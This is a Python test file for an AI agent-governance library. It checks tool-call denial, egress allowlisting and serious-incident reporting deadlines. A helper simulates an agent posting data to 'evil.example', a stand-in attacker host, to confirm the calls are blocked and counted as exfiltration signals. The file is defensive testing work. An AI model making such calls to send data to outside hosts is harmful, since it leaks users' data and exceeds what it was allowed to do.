import time

import pytest

from marshal_ai import InMemoryAuditSink, Principal, RiskTierPolicy, SQLiteAuditSink, ToolCallDenied, ToolGuard
from marshal_ai.egress import EgressAllowlist, EgressPolicy
from marshal_ai.incidents import (
    IncidentEntry,
    incident_candidates,
    record_incident,
    render_incident_markdown,
    serious_incident_report,
)

DPO = Principal("dpo@company")
DAY = 86_400


def _exfil_attempts(sink, n=3, who="agent-7"):
    policy = EgressPolicy(RiskTierPolicy({"low": "allow"}), EgressAllowlist(["api.internal"]), audit_sink=sink)
    guard = ToolGuard(tool=lambda **kw: 1, policy=policy, audit_sink=sink, tool_name="http_post")
    for _ in range(n):
        with pytest.raises(ToolCallDenied):
            guard.call(Principal(who), {"url": "https://evil.example/?d=x"})


@pytest.mark.parametrize(
    "kwargs,days",
    [
        ({"category": "fundamental_rights"}, 15),
        ({"category": "death_or_serious_harm", "death": True}, 10),
        ({"category": "critical_infrastructure"}, 2),
        ({"category": "fundamental_rights", "widespread": True}, 2),
    ],
)
def test_article_73_deadlines(kwargs, days):
    sink = InMemoryAuditSink()
    entry = record_incident(sink, DPO, title="t", description="d", role="provider", aware_at=1_000_000, **kwargs)
    report = serious_incident_report(sink, entry.incident_id, now=1_000_000)
    assert report.authority_days == days
    assert report.authority_deadline == 1_000_000 + days * DAY
    assert report.deployer_notice_deadline is None


def test_deployer_notice_is_24h_and_drives_overdue():
    sink = InMemoryAuditSink()
    entry = record_incident(sink, DPO, title="t", category="fundamental_rights", description="d", aware_at=0)
    assert serious_incident_report(sink, entry.incident_id, now=23 * 3600).overdue is False
    late = serious_incident_report(sink, entry.incident_id, now=25 * 3600)
    assert late.overdue is True and late.deployer_notice_deadline == 24 * 3600


def test_candidates_surface_signals_but_never_declare_an_incident():
    sink = InMemoryAuditSink()
    _exfil_attempts(sink, n=4)
    signals = incident_candidates(sink)
    assert signals[0].signal == "exfiltration_blocked" and signals[0].count == 4
    assert signals[0].principals == ["agent-7"]
    assert not any(isinstance(e, IncidentEntry) for e in sink.all_entries())


def test_report_gathers_related_activity_for_affected_principals_only():
    sink = InMemoryAuditSink()
    _exfil_attempts(sink, n=2, who="agent-7")
    _exfil_attempts(sink, n=5, who="unrelated-bot")
    entry = record_incident(
        sink, DPO, title="Customer data sent to unknown host", category="fundamental_rights",
        description="Agent attempted to post CRM data externally.", affected_principals=("agent-7",),
        window_start=time.time() - 60,
    )
    report = serious_incident_report(sink, entry.incident_id)
    assert report.related_activity["tool_call"] == {"deny": 2}
    assert report.related_activity["egress"] == {"blocked": 2}
    assert "evil.example/?d" not in str(report.to_dict())  # counts, never content


def test_report_verifies_the_hash_chain_on_sqlite(tmp_path):
    sink = SQLiteAuditSink(tmp_path / "audit.db")
    _exfil_attempts(sink)
    entry = record_incident(sink, DPO, title="t", category="fundamental_rights", description="d")
    report = serious_incident_report(sink, entry.incident_id)
    assert report.chain_ok is True and report.chain_checked == len(sink)
    markdown = render_incident_markdown(report)
    assert "Hash chain verified" in markdown and entry.incident_id in markdown


def test_unknown_incident_and_invalid_inputs():
    sink = InMemoryAuditSink()
    with pytest.raises(KeyError):
        serious_incident_report(sink, "inc-missing")
    with pytest.raises(ValueError):
        record_incident(sink, DPO, title="t", category="mild", description="d")  # type: ignore[arg-type]
    with pytest.raises(ValueError):
        record_incident(sink, DPO, title="t", category="fundamental_rights", description="d", role="user")  # type: ignore[arg-type]
